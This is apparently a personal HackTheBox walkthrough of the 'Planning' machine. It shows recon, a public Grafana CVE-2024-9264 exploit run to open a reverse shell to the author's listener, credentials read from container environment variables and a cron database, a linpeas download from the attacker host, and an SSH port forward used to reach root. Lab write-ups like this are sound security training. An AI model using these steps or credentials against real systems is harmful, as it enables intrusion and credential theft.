---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Port-Forwarding
  - Grafana
  - CVE-2024-9264
---
# Overview

| Name        | Planning  |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [30] |
| Status      | Done      |
# Recon

## Machine Info

As is common in real life pentests, you will start the Planning box with credentials for the following account: `admin / 0D5oT70Fq13EvB5r`
## Nmap

```bash
~/Hentai/HTB ❯ nmap -sC -sV 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 16:42 +0545
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.30% done; ETC: 16:43 (0:00:42 remaining)
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Seems as nothing just site is open.
# Enumeration

```bash

~/Hentai/HTB ❯ ffuf -u http://planning.htb/FUZZ -w directory-list-2.3-medium.txt -c -t 50

img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 334ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 324ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 322ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 320ms]
```

- Only these and all 403.
## Subdomain Enumeration

```bash
~/Hentai/HTB 8s ❯ ffuf -u http://planning.htb/ -H "Host:FUZZ.planning.htb" -w Subdomain.txt -c -t 50 -fs 178
grafana
```

- [Wordlist](https://raw.githubusercontent.com/n0kovo/n0kovo_subdomains/refs/heads/main/n0kovo_subdomains_small.txt)

- Gives `grafana` but takes really long time.
- Now we can login with given `credentials`.
- Noticed version of grafana during login `**Grafana v11.0.0.**`
# Exploitation
## CVE-2024-9264

- Searched `Grafana v11.0.0 reverse shell`.
- Got this [repo](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

```bash
~/Hentai/HTB/CVE-2024-9264-RCE-Exploit main* CVE-2024-9264-RCE-Exploit ❯ python3 poc.py --url http://grafana.planning.htb:80/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.79 --reverse-port 9001 
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9001
```

```bash
~ ❯ nc -nlvp 9001                 
Listening on 0.0.0.0 9001
Connection received on 10.10.11.68 60470
sh: 0: cant access tty; job control turned off
# ls
LICENSE
bin
conf
public
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/home
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=ls
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/
# 
```

- We are in Docker environment so used `env` and got this `GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!` and `GF_SECURITY_ADMIN_USER=enzo`.
- From this we know user is `enzo` and password is `RioTecRANDEntANT!`
- Now we can SSH.
## User 

```bash
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt
64c78ff81b1564e6e2ff228e53be1d38
enzo@planning:~$ 
```
# Privilege Escalation

```bash
enzo@planning:~$ wget http://10.10.14.79/linpeas.sh
--2025-06-03 11:43:22--  http://10.10.14.79/linpeas.sh
Connecting to 10.10.14.79:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                            100%[========================================================================>] 932.07K   462KB/s    in 2.0s    

2025-06-03 11:43:25 (462 KB/s) - ‘linpeas.sh’ saved [954437/954437]

enzo@planning:~$ chmod +x linpeas.sh
enzo@planning:~$ ./linpeas.sh
```

- Using `Linpeas` for enumeration.

```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-valid-for 6

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
```

- Found this interesting.

```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db                                                                                   {"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
enzo@planning:~$ 
```

- Oh Fuck I thought this `P4ssw0rdS0pRi0T3c` was Root password.
- But If we look up in `Linpeas` scan we get this.

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:38917         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

- Its hosting websites so port forwarding.

```bash
~/Hentai/HTB/CVE-2024-9264-RCE-Exploit main* 20m 58s ❯ ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```

- Now go to `http://localhost:8000` and enter user `root` and password `P4ssw0rdS0pRi0T3c` that we got from `crontab.db`

![[Crontab.png]]

- We are reading `flag.txt` and putting in our `enzo` home directory.
- Don't know why Reverse Shell didn't work.

```bash
enzo@planning:~$ ls
linpeas.sh  pspy64  root.txt  user.txt
enzo@planning:~$ cat root.txt
# Fuck Yeah
```

---
